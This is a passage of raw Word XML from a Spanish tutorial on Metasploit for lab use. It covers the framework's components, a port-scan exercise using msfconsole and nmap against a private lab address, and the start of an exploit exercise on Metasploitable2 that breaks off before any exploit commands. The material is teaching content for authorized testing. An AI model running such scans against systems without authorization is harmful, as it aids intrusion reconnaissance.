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15FE6" w14:textId="0E7225A3" w:rsidR="00C00D45" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:pStyle w:val="Ttulo"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>METASPLOIT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="732A2E48" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02A71B58" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> — versión simplificada y corregida</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD09F09" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">1) ¿Qué es </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>? (versión corta)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61721295" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> Framework es una plataforma para pruebas de penetración que centraliza </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>exploits</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>payloads</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">, módulos auxiliares y herramientas </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>post-explotación</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>. Viene preinstalado en Kali y se usa en entornos de aprendizaje y auditoría autorizada.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703FC7B3" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00000000" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:pict w14:anchorId="17E5019D">
          <v:rect id="_x0000_i1025" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="59DD1B9B" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>2) Componentes clave (muy breve)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1278F3A3" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Exploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>: aprovecha una vulnerabilidad.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45275E06" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Payload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>: lo que se ejecuta en la víctima (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>shell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>...).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="124EF3A9" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Auxiliar</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">: escáneres, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>fuzzers</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>, etc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E647F3" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Post</w:t>
      </w:r>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>: comandos para después de obtener acceso.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12631FE7" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>msfvenom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">: generador de </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>payloads</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FCBA6AC" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00000000" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:pict w14:anchorId="477B94E3">
          <v:rect id="_x0000_i1026" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C618CF" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>3) Ejercicios simplificados (3 ejercicios)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B28EA5" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Ejercicio A — Escaneo rápido de puertos (método </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11173ACB" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Objetivo: detectar puertos abiertos con un módulo auxiliar.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433731F9" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Inicia </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> en Kali:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3784E816" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">sudo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>msfdb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>init</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">    # (si no está inicializado)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C86A8A" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="23ABDBBE" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Carga el módulo de escaneo TCP:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1319D6ED" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:r w:rsidRPr="00E149BA">
        <w:t>use auxiliary/scanner/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>portscan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="61570B57" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:r w:rsidRPr="00E149BA">
        <w:t>set RHOSTS 192.168.56.101</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635AE481" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>set THREADS 10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30FD0D91" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76FE524F" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Resultado esperado: lista de puertos abiertos (ej. 22/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> open </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>ssh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>, 80/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> open http).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15A88A5A" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Notas:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD056AA" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>RHOSTS puede ser un rango 192.168.56.0/24.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C99ABE6" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Si quieres más precisión, usa </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> fuera de </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>sS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p- 192.168.56.101.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E645F02" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00000000" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:pict w14:anchorId="6B0BB2C9">
          <v:rect id="_x0000_i1027" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B9DC25F" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Ejercicio B — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Exploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> sencillo (ejemplo histórico y seguro: laboratorio)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E3666B2" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Objetivo: cargar un </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>exploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> en un entorno vulnerable (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/DVWA).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="580E6645" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Arranca la VM vulnerable (por </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>ejemplo</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> Metasploitable2).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B765A54" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>En Kali:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46742C9F" w14:textId="77777777" w:rsidR="00E149BA" w:rsidRPr="00E149BA" w:rsidRDefault="00E149BA" w:rsidP="00E149BA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E149BA">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
